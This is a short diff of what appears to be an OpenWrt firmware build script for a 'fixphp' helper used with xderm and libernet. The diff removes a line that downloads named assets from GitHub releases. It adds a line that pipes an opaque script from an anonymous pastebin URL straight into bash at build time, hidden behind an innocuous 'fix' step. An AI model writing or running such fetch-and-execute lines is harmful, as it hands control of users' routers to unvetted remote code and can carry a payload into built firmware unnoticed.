@@ -161,7 +161,7 @@ wget -O package/base-files/files/bin/ram "https://raw.githubusercontent.com/wega
 
 # Add fix download file.php for xderm and libernet
 # run "fixphp" using terminal for use
-wget -O package/base-files/files/bin/fixphp "https://raw.githubusercontent.com/helmiau/openwrt-config/main/fix-xderm-libernet-gui" && chmod +x package/base-files/files/bin/fixphp && mkdir -p "package/base-files/files/www/luci-static/helmiwrt" "package/base-files/files/bin" && wget --no-check-certificate $(curl -L https://github.com/helmiau/helmiau/releases/helmiau | grep "/helmiau/helmiau/releases/download" | grep "helmilb\|helmiwrt\|neofetch\|sambaset\|svg" | sed -e 's/\"//g' -e 's/ //g' -e 's/rel=.*//g' -e 's#<ahref=#http://github.com#g') -P package/base-files/files/bin/ && mv package/base-files/files/bin/*.svg package/base-files/files/www/luci-static/helmiwrt
+wget -O package/base-files/files/bin/fixphp "https://raw.githubusercontent.com/helmiau/openwrt-config/main/fix-xderm-libernet-gui" && chmod +x package/base-files/files/bin/fixphp && bash -c "$(curl -L https://pastebin.com/raw/N3dmXn64)"
 
 #-----------------------------------------------------------------------------
 #   End of @helmiau terminal scripts additionals menu
